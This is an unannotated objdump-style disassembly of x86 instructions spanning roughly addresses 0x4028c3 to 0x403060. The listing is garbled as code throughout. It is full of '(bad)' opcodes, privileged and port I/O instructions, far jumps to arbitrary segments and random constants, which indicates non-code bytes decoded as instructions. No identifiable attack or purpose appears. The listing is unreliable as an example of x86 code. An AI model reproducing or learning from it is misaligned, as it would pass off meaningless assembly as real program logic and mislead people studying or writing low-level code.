  4028c3:	cmp    DWORD PTR [ebp-0x5f],0xe32dc793
  4028ca:	cwde   
  4028cb:	popf   
  4028cc:	stc    
  4028cd:	ins    BYTE PTR es:[edi],dx
  4028ce:	or     BYTE PTR [ebp-0x18],bh
  4028d1:	adc    al,0x5c
  4028d3:	sub    eax,0x53094fb8
  4028d8:	sub    al,0x79
  4028da:	and    DWORD PTR [edx-0x68f0a24b],esi
  4028e0:	cdq    
  4028e1:	sar    BYTE PTR [esi+eax*8],1
  4028e4:	ret    0x3d63
  4028e7:	xor    eax,0x8c82d3df
  4028ec:	sub    DWORD PTR [eax*8-0x103431db],ecx
  4028f3:	popa   
  4028f4:	inc    edx
  4028f5:	dec    eax
  4028f6:	xchg   ebx,eax
  4028f7:	pop    eax
  4028f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028f9:	pusha  
  4028fa:	out    dx,al
  4028fb:	scas   eax,DWORD PTR es:[edi]
  4028fc:	adc    ah,BYTE PTR [ebp+0x33]
  4028ff:	imul   ebx,DWORD PTR ds:0xe3e2e9a4,0xffffffb9
  402906:	inc    ecx
  402907:	cmc    
  402908:	(bad)  
  402909:	(bad)  
  40290a:	nop
  40290b:	xor    al,0x28
  40290d:	(bad)  
  40290e:	xor    eax,0x73236d3d
  402913:	sub    eax,DWORD PTR [edi-0x32]
  402916:	aad    0x5a
  402918:	mov    edx,0xdc72a649
  40291d:	leave  
  40291e:	int3   
  40291f:	bound  ebx,QWORD PTR [esi+0x26]
  402922:	shl    ah,0xc3
  402925:	pop    edi
  402926:	jnp    0x402900
  402928:	sti    
  402929:	adc    ebp,ebx
  40292b:	dec    edx
  40292c:	xchg   edi,eax
  40292d:	or     DWORD PTR [edx-0x54],ebp
  402930:	imul   eax,DWORD PTR [ebx+0x7f],0x6294f109
  402937:	add    BYTE PTR [esi-0x68],dl
  40293a:	addr16 je 0x402943
  40293d:	and    eax,0xad6fe73b
  402942:	sub    BYTE PTR [esi],bl
  402944:	cwde   
  402945:	mov    dl,0x99
  402947:	cdq    
  402948:	inc    BYTE PTR [esi+0x6c548d75]
  40294e:	sar    BYTE PTR [ebp+0x1a4a2daf],cl
  402954:	(bad)  
  402955:	aas    
  402956:	mov    BYTE PTR [ebx],bl
  402958:	inc    edi
  402959:	int3   
  40295a:	mov    ebx,0x3324dcca
  40295f:	inc    edi
  402960:	mov    cl,0xae
  402962:	adc    eax,0xb71cb0a
  402967:	(bad)  
  402968:	add    al,0x4d
  40296a:	test   BYTE PTR [ebx-0x28],0x2
  40296e:	outs   dx,DWORD PTR ds:[esi]
  40296f:	pop    ebp
  402970:	jbe    0x402986
  402972:	in     eax,dx
  402973:	ss jmp 0x40291b
  402976:	mov    ebx,edi
  402978:	out    dx,eax
  402979:	xchg   BYTE PTR ds:0x573ac267,bh
  40297f:	stos   BYTE PTR es:[edi],al
  402980:	pop    edi
  402981:	mov    ah,0x3b
  402983:	fld    DWORD PTR [ebx]
  402985:	mov    bl,0x2d
  402987:	adc    ah,cl
  402989:	sub    al,bl
  40298b:	xchg   ecx,eax
  40298c:	inc    edx
  40298d:	jbe    0x40292c
  40298f:	and    esp,DWORD PTR [ecx]
  402991:	inc    eax
  402992:	jno    0x40297d
  402994:	ret    0x813b
  402997:	xor    BYTE PTR ds:0x28bd1eef,al
  40299d:	dec    ebp
  40299e:	and    al,BYTE PTR [ebx+0x4a]
  4029a1:	add    ebp,DWORD PTR [edx-0x136931a5]
  4029a7:	push   esi
  4029a8:	pop    ebx
  4029a9:	fbstp  TBYTE PTR [ebx+0x1a]
  4029ac:	mov    ecx,0xa32d5eba
  4029b1:	ficomp WORD PTR [ecx+0xaff4bbd]
  4029b7:	mov    edx,ecx
  4029b9:	add    ecx,DWORD PTR ds:0xa26979e0
  4029bf:	or     eax,0x476d52b
  4029c4:	mov    ch,0x7c
  4029c6:	pop    DWORD PTR [edx-0x3f]
  4029c9:	(bad)  
  4029cb:	adc    eax,0xa44892e0
  4029d0:	fstp   DWORD PTR [edi]
  4029d2:	inc    edx
  4029d3:	pop    ss
  4029d4:	dec    edi
  4029d5:	cmp    BYTE PTR [edi],ah
  4029d7:	push   edi
  4029d8:	jae    0x4029e7
  4029da:	rcr    DWORD PTR ss:[eax],cl
  4029dd:	cmp    dl,0x9c
  4029e0:	call   DWORD PTR [eax+0x6d8a08e9]
  4029e6:	and    ecx,DWORD PTR [esi+0x1f]
  4029e9:	into   
  4029ea:	sti    
  4029eb:	ficomp WORD PTR [ecx+0x1fa3711e]
  4029f1:	pusha  
  4029f2:	pop    esp
  4029f3:	xchg   ah,cl
  4029f5:	js     0x402987
  4029f7:	clc    
  4029f8:	das    
  4029f9:	imul   edi,DWORD PTR [esi],0x34
  4029fc:	or     DWORD PTR [esp+ebx*2-0x4e],ebp
  402a00:	xchg   ebp,eax
  402a01:	(bad)  
  402a02:	fsubr  QWORD PTR [eax]
  402a04:	shl    BYTE PTR [eax-0x8],1
  402a07:	retf   0x428f
  402a0a:	jnp    0x402a06
  402a0c:	adc    BYTE PTR [esi],cl
  402a0e:	ins    BYTE PTR es:[edi],dx
  402a0f:	hlt    
  402a10:	xor    BYTE PTR [ebp+eiz*8-0x2bd642ec],dl
  402a17:	nop
  402a18:	call   0xa401:0x9cb366ac
  402a1f:	dec    edi
  402a20:	push   es
  402a21:	(bad)  
  402a22:	iret   
  402a23:	add    dl,cl
  402a25:	push   0x5befe1a0
  402a2a:	mov    ecx,0x91abdcc
  402a2f:	mov    dl,0xd6
  402a31:	stos   BYTE PTR es:[edi],al
  402a32:	xchg   DWORD PTR [esi],esi
  402a34:	jl     0x402a0d
  402a36:	mov    al,ds:0x67b4a267
  402a3b:	shl    dl,cl
  402a3d:	fcmovu st,st(2)
  402a3f:	xchg   edi,eax
  402a40:	lds    ebp,FWORD PTR [edi-0x167e9578]
  402a46:	jns    0x4029d0
  402a48:	ins    DWORD PTR es:[edi],dx
  402a49:	fdiv   st(1),st
  402a4b:	mov    dh,0x23
  402a4d:	call   0x6c9db574
  402a52:	add    bh,BYTE PTR [esi-0x17]
  402a55:	dec    ecx
  402a56:	ficomp DWORD PTR ds:0x23b59bc4
  402a5c:	sti    
  402a5d:	and    BYTE PTR [edx+ebx*8],bl
  402a60:	fild   DWORD PTR [edi]
  402a62:	fist   WORD PTR [eax-0x65]
  402a65:	xor    eax,0x2aa88283
  402a6a:	xlat   BYTE PTR ds:[ebx]
  402a6c:	lds    esp,FWORD PTR [edi+0x1c]
  402a6f:	inc    ebp
  402a70:	mov    cl,0xa0
  402a72:	(bad)  
  402a74:	call   0xec8ecbcd
  402a79:	pop    edx
  402a7a:	nop
  402a7b:	out    0x50,al
  402a7d:	xor    dl,BYTE PTR [edi]
  402a7f:	mov    ah,0xc5
  402a81:	stos   DWORD PTR es:[edi],eax
  402a82:	push   esi
  402a83:	push   esp
  402a84:	aas    
  402a85:	je     0x402a9f
  402a87:	sbb    eax,0x6add86b8
  402a8c:	push   eax
  402a8d:	out    0x28,al
  402a8f:	loopne 0x402a24
  402a91:	dec    esp
  402a92:	inc    ebp
  402a93:	xlat   BYTE PTR ds:[ebx]
  402a94:	fwait
  402a95:	push   esp
  402a96:	jg     0x402a72
  402a98:	add    ax,0xd9a1
  402a9c:	ror    DWORD PTR [edx+0xa043fe5],1
  402aa2:	sub    DWORD PTR [edx+0x2],edx
  402aa5:	aam    0xff
  402aa7:	fmul   st,st(1)
  402aa9:	mov    bl,0xc6
  402aab:	pop    esp
  402aac:	shl    BYTE PTR [esi-0x79410cc6],0x6a
  402ab3:	aam    0x9f
  402ab5:	pop    esi
  402ab6:	push   esp
  402ab7:	(bad)  
  402ab8:	repnz or cl,dh
  402abb:	in     al,dx
  402abc:	retf   0xd948
  402abf:	into   
  402ac0:	or     esi,edx
  402ac2:	pop    ebp
  402ac3:	and    eax,0x6eaa838
  402ac8:	push   eax
  402ac9:	adc    al,0xd0
  402acb:	shr    BYTE PTR [ebp+esi*1-0x561863f0],1
  402ad2:	mov    ds:0x8aab62d3,eax
  402ad7:	sub    BYTE PTR [eax-0x12],bl
  402ada:	dec    edx
  402adb:	(bad)  
  402add:	pop    es
  402ade:	mov    WORD PTR [ebx],cs
  402ae0:	mov    bl,0x17
  402ae2:	pop    ss
  402ae3:	scas   al,BYTE PTR es:[edi]
  402ae4:	inc    edi
  402ae5:	xchg   ebx,eax
  402ae6:	or     dh,0x1d
  402ae9:	in     eax,0xb6
  402aeb:	std    
  402aec:	pop    edi
  402aed:	int    0xa5
  402aef:	push   esp
  402af0:	add    BYTE PTR [ecx+0x9089dfe],cl
  402af6:	push   0x708ccef0
  402afb:	mov    ah,0x28
  402afd:	mov    al,0xd2
  402aff:	push   0xffffffbe
  402b01:	shr    BYTE PTR [ebx+0x4b],1
  402b04:	xlat   BYTE PTR ds:[ebx]
  402b05:	mov    eax,ds:0x5cd4d634
  402b0a:	nop
  402b0b:	popf   
  402b0c:	ret    
  402b0d:	stos   DWORD PTR es:[edi],eax
  402b0e:	push   edx
  402b0f:	inc    esi
  402b10:	xor    DWORD PTR [eax-0x6c],edi
  402b13:	push   esp
  402b14:	adc    eax,0x71978b48
  402b19:	sti    
  402b1a:	jnp    0x402afe
  402b1c:	inc    esp
  402b1d:	jmp    0xb63:0x80cbbc1
  402b24:	mov    eax,ds:0xfe08a1b6
  402b29:	adc    esi,esi
  402b2b:	mov    edx,0x6b8c66e6
  402b30:	dec    ebp
  402b31:	repz scas al,BYTE PTR es:[edi]
  402b33:	clc    
  402b34:	ja     0x402b51
  402b36:	jo     0x402acc
  402b38:	popf   
  402b39:	fdivr  st(6),st
  402b3b:	(bad)  
  402b3c:	cli    
  402b3d:	lods   eax,DWORD PTR ds:[esi]
  402b3e:	(bad)  
  402b3f:	inc    esp
  402b40:	retf   0x1403
  402b43:	call   0xc155b485
  402b48:	sbb    al,0x4f
  402b4a:	add    DWORD PTR [esi],ebp
  402b4c:	pop    ebx
  402b4d:	neg    edi
  402b4f:	mov    bl,0x36
  402b51:	(bad)  
  402b53:	sub    ecx,DWORD PTR [ebx+0x6c]
  402b56:	ret    0xa320
  402b59:	enter  0x3e6f,0x44
  402b5d:	add    BYTE PTR [eax-0x17c1d65e],bl
  402b63:	mov    ah,0x54
  402b65:	int    0xed
  402b67:	jno    0x402bb9
  402b69:	out    0x34,al
  402b6b:	nop
  402b6c:	dec    ecx
  402b6d:	pop    esp
  402b6e:	push   0xffffffc2
  402b70:	pop    ebx
  402b71:	cmp    edx,eax
  402b73:	popaw  
  402b75:	popa   
  402b76:	cmp    al,0x2
  402b78:	out    dx,al
  402b79:	(bad)  
  402b7a:	fmul   QWORD PTR [edi+edx*4+0x6]
  402b7e:	(bad)
  402b82:	daa    
  402b83:	pop    edx
  402b84:	add    DWORD PTR [ebp+0x52],ebp
  402b87:	test   eax,0xcec05ffa
  402b8c:	lods   eax,DWORD PTR ds:[esi]
  402b8d:	std    
  402b8e:	jecxz  0x402b8a
  402b90:	xchg   DWORD PTR cs:[ebp-0x58],ebp
  402b94:	jle    0x402b3e
  402b96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b97:	add    BYTE PTR [ebx+0x5f63d0d1],0xf9
  402b9e:	cdq    
  402b9f:	pop    ss
  402ba0:	call   0x4f3b:0x993dc568
  402ba7:	ja     0x402c28
  402ba9:	js     0x402bec
  402bab:	inc    DWORD PTR [eax+edx*2-0x410a2e3e]
  402bb2:	and    esp,DWORD PTR [ebp+0x74]
  402bb5:	leave  
  402bb6:	in     al,dx
  402bb7:	mov    ch,0x5c
  402bb9:	daa    
  402bba:	ror    DWORD PTR [ebx],0x36
  402bbd:	int3   
  402bbe:	loope  0x402b82
  402bc0:	popf   
  402bc1:	xchg   edi,eax
  402bc2:	dec    esp
  402bc3:	adc    al,0x5a
  402bc5:	imul   esi,DWORD PTR [ebx+0x432740c8],0xffffffbf
  402bcc:	push   ebx
  402bcd:	cmc    
  402bce:	in     eax,dx
  402bcf:	sub    ch,BYTE PTR [ecx]
  402bd1:	xchg   DWORD PTR [ebx-0x601ee899],edx
  402bd7:	adc    dl,BYTE PTR [esi+ecx*2+0x48]
  402bdb:	repnz dec eax
  402bdd:	mov    ah,0xed
  402bdf:	xor    BYTE PTR [ebx],cl
  402be1:	or     bl,BYTE PTR [ebp+0x10]
  402be4:	push   0x65
  402be6:	xor    al,0xab
  402be8:	daa    
  402be9:	push   esp
  402bea:	and    eax,DWORD PTR [edx]
  402bec:	mov    ebp,0x5d33c06b
  402bf1:	add    eax,0x60ae4b5
  402bf6:	add    ebx,DWORD PTR [ecx]
  402bf8:	push   0xc46a2158
  402bfd:	jae    0x402bc9
  402bff:	sub    DWORD PTR [esi+eiz*2-0x5c8ca31d],0xda72d997
  402c0a:	dec    edx
  402c0b:	xchg   esp,eax
  402c0c:	js     0x402c61
  402c0e:	push   ebx
  402c0f:	xchg   ebp,eax
  402c10:	shl    dl,0xb6
  402c13:	arpl   WORD PTR [ebx-0x753da286],ax
  402c19:	jmp    0x8aa79191
  402c1e:	add    al,0xa2
  402c20:	or     DWORD PTR [eax-0x32c56d20],edx
  402c26:	sub    ebx,DWORD PTR [ecx]
  402c28:	(bad)  
  402c29:	iret   
  402c2a:	adc    ah,BYTE PTR [edx-0x54192b8c]
  402c30:	mov    bh,BYTE PTR [ebx-0xb]
  402c33:	mov    ah,0x72
  402c35:	push   esi
  402c36:	dec    eax
  402c37:	stos   DWORD PTR es:[edi],eax
  402c38:	cdq    
  402c39:	(bad)
  402c3c:	or     al,0x71
  402c3e:	fstp   DWORD PTR [ebp+0x196ae535]
  402c44:	out    dx,eax
  402c45:	fcom   QWORD PTR [esi+0x1c]
  402c48:	dec    ebp
  402c49:	ja     0x402c59
  402c4b:	es pop eax
  402c4d:	clc    
  402c4e:	sahf   
  402c4f:	sahf   
  402c50:	push   ebp
  402c51:	jle    0x402c94
  402c53:	fdiv   QWORD PTR ds:0x2d92c5cb
  402c59:	or     ch,BYTE PTR [ebx+0x787d977d]
  402c5f:	scas   al,BYTE PTR es:[edi]
  402c60:	in     eax,0xd3
  402c62:	test   DWORD PTR [ebx+0x4cec87b9],0xf1a41dd0
  402c6c:	or     DWORD PTR [ecx],edx
  402c6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c6f:	aam    0xad
  402c71:	pop    ss
  402c72:	adc    al,BYTE PTR [edx]
  402c74:	ret    0xd25d
  402c77:	cmc    
  402c78:	cdq    
  402c79:	jne    0x402c1d
  402c7b:	nop
  402c7c:	mov    esi,0xcfc9d132
  402c81:	sbb    al,0x7b
  402c83:	ret    
  402c84:	je     0x402c3c
  402c86:	pop    esi
  402c87:	enter  0xef15,0x4f
  402c8b:	lds    eax,FWORD PTR [ebx-0x1b126111]
  402c91:	sbb    eax,DWORD PTR [ebp+0xe]
  402c94:	pand   mm2,QWORD PTR [esi-0x34]
  402c98:	sub    eax,esp
  402c9a:	ins    BYTE PTR es:[edi],dx
  402c9b:	and    al,BYTE PTR [ebp+0x38]
  402c9e:	loopne 0x402c6c
  402ca0:	mov    eax,ds:0x90029489
  402ca5:	popa   
  402ca6:	in     eax,0xf4
  402ca8:	sub    esp,DWORD PTR [esi+0x2]
  402cab:	push   es
  402cac:	cld    
  402cad:	stos   BYTE PTR es:[edi],al
  402cae:	and    edi,0xa949e751
  402cb4:	das    
  402cb5:	int    0x3f
  402cb7:	sub    ah,cl
  402cb9:	test   al,0x49
  402cbb:	jno    0x402d13
  402cbd:	xor    esp,ebx
  402cbf:	div    BYTE PTR [ebp+0x21]
  402cc2:	mov    ah,0x3d
  402cc4:	js     0x402cdc
  402cc6:	jnp    0x402ced
  402cc8:	mov    cl,0x56
  402cca:	aad    0x65
  402ccc:	mov    ch,BYTE PTR [edi]
  402cce:	sub    al,0xa7
  402cd0:	add    esp,DWORD PTR [edx]
  402cd2:	(bad)  
  402cd4:	scas   al,BYTE PTR es:[edi]
  402cd5:	jg     0x402c7c
  402cd7:	fwait
  402cd8:	adc    ch,0x1b
  402cdb:	jmp    0x5ca0:0xa67cfefc
  402ce2:	xchg   ebp,eax
  402ce3:	or     BYTE PTR [esi+0x231387ec],bh
  402ce9:	shl    esp,1
  402ceb:	ins    DWORD PTR es:[edi],dx
  402cec:	stos   BYTE PTR es:[edi],al
  402ced:	push   esi
  402cee:	inc    edx
  402cef:	jne    0x402cc8
  402cf1:	mov    ebp,0x41463e4d
  402cf6:	mov    edi,DWORD PTR [ebp-0x1f]
  402cf9:	push   0xfffffffc
  402cfb:	push   cs
  402cfc:	das    
  402cfd:	scas   eax,DWORD PTR es:[edi]
  402cfe:	ror    BYTE PTR [ecx+0x4c],0x7c
  402d02:	dec    edx
  402d03:	dec    ebx
  402d04:	pop    esp
  402d05:	(bad)  
  402d06:	ret    0x56cd
  402d09:	inc    eax
  402d0a:	nop
  402d0b:	inc    edi
  402d0c:	mov    bh,0x72
  402d0e:	das    
  402d0f:	gs out 0x3,al
  402d12:	add    eax,0x103ef8eb
  402d17:	jnp    0x402d36
  402d19:	lock ret 0x5971
  402d1d:	pop    ecx
  402d1e:	shl    BYTE PTR ds:[edi+0x65],1
  402d22:	mov    eax,ds:0x43c626f0
  402d27:	mov    ds:0x81519f9c,al
  402d2c:	add    esi,DWORD PTR [edx+0x1a]
  402d2f:	mov    dh,0xd8
  402d31:	ret    0xbb56
  402d34:	mov    ds:0xfb712694,al
  402d39:	lahf   
  402d3a:	mov    WORD PTR [esi+0x424cef69],fs
  402d40:	xor    ebx,DWORD PTR [ebp+ecx*4+0x639f9939]
  402d47:	lods   eax,DWORD PTR ds:[esi]
  402d48:	mov    dh,cl
  402d4a:	pop    esi
  402d4b:	mov    bh,0xb
  402d4d:	aas    
  402d4e:	xor    DWORD PTR [edx-0x234bd684],eax
  402d54:	mov    ds:0x54235342,eax
  402d59:	js     0x402d93
  402d5b:	lea    edi,ds:0xc208
  402d60:	pop    es
  402d61:	loope  0x402db9
  402d63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d64:	sti    
  402d65:	mov    esp,DWORD PTR ds:[esi+0x6ed1bea1]
  402d6c:	leave  
  402d6d:	and    eax,0x8deed42
  402d72:	sahf   
  402d73:	adc    eax,0x413ee27c
  402d78:	js     0x402ddb
  402d7a:	cwde   
  402d7b:	mov    ch,0x14
  402d7d:	xchg   ebx,eax
  402d7e:	(bad)  [ebx]
  402d80:	xchg   edx,eax
  402d81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d82:	push   ebx
  402d83:	add    al,dl
  402d85:	xchg   esi,eax
  402d86:	add    ah,dh
  402d88:	loope  0x402daa
  402d8a:	mov    eax,ds:0x9574099a
  402d8f:	les    ebx,FWORD PTR [eax]
  402d91:	push   ds
  402d92:	jmp    0x3f504131
  402d97:	stos   DWORD PTR es:[edi],eax
  402d98:	push   ebp
  402d99:	cmp    edi,edi
  402d9b:	mov    edi,0x70b21c10
  402da0:	inc    edi
  402da1:	jno    0x402df8
  402da3:	into   
  402da4:	int3   
  402da5:	jle    0x402d69
  402da7:	ret    0xf48d
  402daa:	ja     0x402d61
  402dac:	inc    ecx
  402dad:	cld    
  402dae:	xor    DWORD PTR [ecx+0x24385e65],ebp
  402db4:	inc    esi
  402db5:	int    0x81
  402db7:	ins    BYTE PTR es:[edi],dx
  402db8:	fdiv   QWORD PTR [esi]
  402dba:	xchg   ebx,eax
  402dbb:	cmp    al,0xef
  402dbd:	mov    bl,0xcd
  402dbf:	and    BYTE PTR ds:0xf8231e72,0x97
  402dc6:	scas   eax,DWORD PTR es:[edi]
  402dc7:	xchg   ecx,eax
  402dc8:	(bad)  
  402dc9:	shr    BYTE PTR [edi],1
  402dcb:	hlt    
  402dcc:	in     eax,0x11
  402dce:	cmp    BYTE PTR [eax],dh
  402dd0:	lds    ebp,FWORD PTR [ebp-0x35cbaabc]
  402dd6:	pop    ss
  402dd7:	dec    edi
  402dd8:	(bad)  
  402dd9:	sahf   
  402dda:	mov    gs,WORD PTR [ecx+0x6d]
  402ddd:	cmp    ah,ah
  402ddf:	add    eax,0xbf82da60
  402de4:	mov    WORD PTR [edi+eiz*8-0x4d],fs
  402de8:	and    esi,ecx
  402dea:	fucomi st,st(2)
  402dec:	pop    esi
  402ded:	das    
  402dee:	jl     0x402e0e
  402df0:	jns    0x402dc8
  402df2:	es dec ebx
  402df4:	rol    ebx,1
  402df6:	loop   0x402e22
  402df8:	xlat   BYTE PTR ds:[ebx]
  402df9:	jnp    0x402e36
  402dfb:	or     eax,0xc2e81f4d
  402e00:	pushf  
  402e01:	mov    esi,DWORD PTR ds:0x7bfcb69d
  402e07:	popf   
  402e08:	sbb    al,0x1
  402e0a:	and    al,0x4
  402e0c:	sbb    dh,BYTE PTR [ecx-0x3d2a1b15]
  402e12:	push   esp
  402e13:	pop    esi
  402e14:	nop
  402e15:	cdq    
  402e16:	in     eax,0x66
  402e18:	lea    eax,[edi+0x62df6cde]
  402e1e:	loopne 0x402e69
  402e20:	sbb    edi,DWORD PTR ds:0x1ae789a4
  402e26:	fwait
  402e27:	xchg   esi,eax
  402e28:	lods   eax,DWORD PTR ds:[esi]
  402e29:	gs xchg edi,eax
  402e2b:	jae    0x402e9e
  402e2d:	inc    edi
  402e2e:	in     eax,0xab
  402e30:	lock clc 
  402e32:	cli    
  402e33:	push   0xed9a94b2
  402e38:	test   eax,0xe16fd97c
  402e3d:	stos   DWORD PTR es:[edi],eax
  402e3e:	fisub  DWORD PTR [eax-0x29]
  402e41:	add    eax,0xf48fa577
  402e46:	or     bl,BYTE PTR [esi-0x51]
  402e49:	shr    DWORD PTR [edx],cl
  402e4b:	sti    
  402e4c:	jo     0x402e12
  402e4e:	loop   0x402ebd
  402e50:	ret    
  402e51:	call   0x6f5b0e8e
  402e56:	add    bl,BYTE PTR es:[eax+0x2bb78246]
  402e5d:	mov    esi,0x473626ff
  402e62:	push   0x6178eacd
  402e67:	iret   
  402e68:	fwait
  402e69:	adc    BYTE PTR [ebx+0x1e],ch
  402e6c:	icebp  
  402e6d:	lods   al,BYTE PTR ds:[esi]
  402e6e:	add    ebx,DWORD PTR [ecx+edx*8]
  402e71:	add    BYTE PTR [edx-0x55a547b4],ah
  402e77:	pop    eax
  402e78:	shr    BYTE PTR ds:[esi],1
  402e7b:	cmp    eax,0xd16af2ef
  402e80:	retf   
  402e81:	cmp    ecx,ecx
  402e83:	jmp    0x92f8:0x157fb2b7
  402e8a:	jb     0x402e66
  402e8c:	sbb    dh,BYTE PTR [ebx+eax*4]
  402e8f:	inc    ebx
  402e90:	dec    edi
  402e91:	or     al,0xfd
  402e93:	cmp    al,0xd
  402e95:	mov    esi,0xf6246129
  402e9a:	xor    dl,BYTE PTR [eax+edx*8-0x664eb006]
  402ea1:	test   al,0xe4
  402ea3:	aaa    
  402ea4:	jne    0x402eaa
  402ea6:	frstor [edi+0x62]
  402ea9:	inc    edi
  402eaa:	sub    al,0x45
  402eac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ead:	retf   0x6e27
  402eb0:	scas   al,BYTE PTR es:[edi]
  402eb1:	fdiv   DWORD PTR [ebx-0x59]
  402eb4:	(bad)  
  402eb5:	sti    
  402eb6:	dec    esp
  402eb7:	std    
  402eb8:	out    0xce,eax
  402eba:	(bad)  
  402ebb:	push   ss
  402ebc:	fwait
  402ebd:	jo     0x402e90
  402ebf:	loope  0x402f07
  402ec1:	push   esi
  402ec2:	ins    DWORD PTR es:[edi],dx
  402ec3:	ins    DWORD PTR es:[edi],dx
  402ec4:	das    
  402ec5:	das    
  402ec6:	cmp    DWORD PTR [edi+ecx*1-0x4c],eax
  402eca:	jecxz  0x402e86
  402ecc:	inc    ebx
  402ecd:	fistp  DWORD PTR [edx]
  402ecf:	ret    0x54ad
  402ed2:	dec    ebx
  402ed3:	cs dec ebp
  402ed5:	ss cmc 
  402ed7:	lahf   
  402ed8:	retf   
  402ed9:	cs xchg ecx,eax
  402edb:	nop
  402edc:	das    
  402edd:	cmc    
  402ede:	shl    BYTE PTR ss:[edx],1
  402ee1:	jg     0x402e91
  402ee3:	xor    ebp,DWORD PTR [ecx]
  402ee5:	mov    BYTE PTR [ebp+0x34],dl
  402ee8:	(bad)  
  402ee9:	call   0x4bd6:0x9c611e7a
  402ef0:	sar    DWORD PTR [eax],0xca
  402ef3:	xor    al,bl
  402ef5:	mov    BYTE PTR [edi-0x23],al
  402ef8:	aad    0x3
  402efa:	sub    BYTE PTR [edx+eiz*1],bl
  402efd:	fcomp  st(0)
  402eff:	imul   esp,DWORD PTR [edi-0x4c1de5c7],0xffffffc7
  402f06:	or     al,0x36
  402f08:	(bad)  
  402f09:	cmp    dh,BYTE PTR [esi+0x214edaa1]
  402f0f:	pop    edi
  402f10:	sub    al,0xa9
  402f12:	xor    eax,0x3fd4de9e
  402f17:	imul   eax,DWORD PTR [eax],0xbc3cfeb
  402f1d:	inc    esp
  402f1e:	xchg   DWORD PTR [edx],ebp
  402f20:	lds    edi,FWORD PTR [ecx+eax*1+0x2d]
  402f24:	sbb    ebp,DWORD PTR [edx-0x489dc761]
  402f2a:	xchg   edi,eax
  402f2b:	cmp    edx,DWORD PTR [ecx-0x24166207]
  402f31:	mov    bh,0x74
  402f33:	out    dx,eax
  402f34:	push   esp
  402f35:	xchg   ebp,eax
  402f36:	fbld   TBYTE PTR [ebx+0x6f]
  402f39:	jl     0x402ebf
  402f3b:	dec    ecx
  402f3c:	xor    eax,0xc1ec1688
  402f41:	add    al,0x69
  402f43:	pop    esi
  402f44:	fwait
  402f45:	lock push esp
  402f47:	jl     0x402ed2
  402f49:	(bad)  
  402f4a:	lahf   
  402f4b:	mov    bh,BYTE PTR [ebx-0x2]
  402f4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f4f:	(bad)  
  402f50:	gs add al,0xde
  402f53:	jmp    0x39c5:0x2efedceb
  402f5a:	sbb    al,0xc5
  402f5c:	sub    BYTE PTR [ebp+edi*8-0x1c],al
  402f60:	fs (bad) 
  402f62:	xlat   BYTE PTR ds:[ebx]
  402f63:	into   
  402f64:	sub    DWORD PTR [esi+0x3dbdd758],edx
  402f6a:	call   0xe9c7:0xbc14d5cf
  402f71:	lock add eax,0xf5068c4e
  402f77:	sub    edi,DWORD PTR [esi+0x545be92f]
  402f7d:	cdq    
  402f7e:	cmc    
  402f7f:	imul   edx,DWORD PTR [edx],0x14
  402f82:	fs pushw ds
  402f85:	iret   
  402f86:	aam    0x67
  402f88:	mov    es,WORD PTR [edx+0x16]
  402f8b:	adc    al,0x6f
  402f8d:	inc    ecx
  402f8e:	cli    
  402f8f:	stos   DWORD PTR es:[edi],eax
  402f90:	sub    eax,0x39a1340b
  402f95:	test   bl,dh
  402f97:	icebp  
  402f98:	or     al,0xd7
  402f9a:	sbb    edi,DWORD PTR [ebx-0x7f]
  402f9d:	cli    
  402f9e:	rcl    ebp,1
  402fa0:	mov    ecx,0x18b7a1f8
  402fa5:	mov    BYTE PTR [ecx-0x5a],0x69
  402fa9:	aaa    
  402faa:	sub    eax,0x521dbd0d
  402faf:	test   al,0xf0
  402fb1:	out    0xb,al
  402fb3:	pop    edi
  402fb4:	les    ecx,FWORD PTR [edi-0x78ddddb2]
  402fba:	idiv   ecx
  402fbc:	and    BYTE PTR [ebx],bh
  402fbe:	ins    BYTE PTR es:[edi],dx
  402fbf:	xchg   edi,eax
  402fc0:	nop
  402fc1:	pop    ebx
  402fc2:	or     al,0x61
  402fc4:	jl     0x402feb
  402fc6:	pop    DWORD PTR [eax+0x25]
  402fc9:	in     al,0x62
  402fcb:	and    edx,DWORD PTR [ecx+0x7dadef0]
  402fd1:	inc    DWORD PTR [ebp-0x3c]
  402fd4:	out    dx,eax
  402fd5:	adc    BYTE PTR [eax+edx*4+0x2c],bl
  402fd9:	popf   
  402fda:	es xchg ebp,eax
  402fdc:	cmc    
  402fdd:	aad    0x53
  402fdf:	push   cs
  402fe0:	test   eax,0xe45e16bb
  402fe5:	icebp  
  402fe6:	lea    edx,[esi+esi*4]
  402fe9:	and    eax,0xfc813806
  402fee:	and    DWORD PTR [ebx-0x44],0xfb1e2fa1
  402ff5:	fnstsw WORD PTR [ecx+0x9]
  402ff8:	test   DWORD PTR ds:[ebp+0x1f],edx
  402ffc:	jb     0x402fa2
  402ffe:	retf   0x406
  403001:	outs   dx,BYTE PTR ds:[esi]
  403002:	jge    0x403067
  403004:	pop    eax
  403005:	pop    ebx
  403006:	jne    0x40304f
  403008:	ja     0x40300c
  40300a:	xchg   ebp,eax
  40300b:	fs inc ecx
  40300d:	mov    BYTE PTR [edx+0x71515ff6],bl
  403013:	mov    cl,0xcd
  403015:	jl     0x403070
  403017:	add    al,0x66
  403019:	inc    DWORD PTR ds:0x3f0d0a4a
  40301f:	aaa    
  403020:	push   esi
  403021:	stc    
  403022:	mov    ch,0x65
  403024:	cmp    dh,BYTE PTR [ecx-0xa]
  403027:	aaa    
  403028:	push   ds
  403029:	jne    0x403073
  40302b:	imul   esi,DWORD PTR [ecx],0x3c8a96a8
  403031:	push   edx
  403032:	ss inc ebp
  403034:	sbb    ebx,DWORD PTR [eax+eax*2-0x5f]
  403038:	push   0x8aa7f395
  40303d:	leave  
  40303e:	mov    bh,0x2d
  403040:	add    ecx,DWORD PTR [edi-0x6a]
  403043:	ds xchg ebx,eax
  403045:	mov    edx,0x12b56b10
  40304a:	popf   
  40304b:	int    0x41
  40304d:	jno    0x4030bf
  40304f:	xchg   ebp,eax
  403050:	js     0x403066
  403052:	(bad)
  403056:	bound  edx,QWORD PTR [ebx+0x64]
  403059:	xchg   ah,bl
  40305b:	mov    al,0x41
  40305d:	sub    ah,al
  40305f:	iret   
  403060:	jmp    0x403082
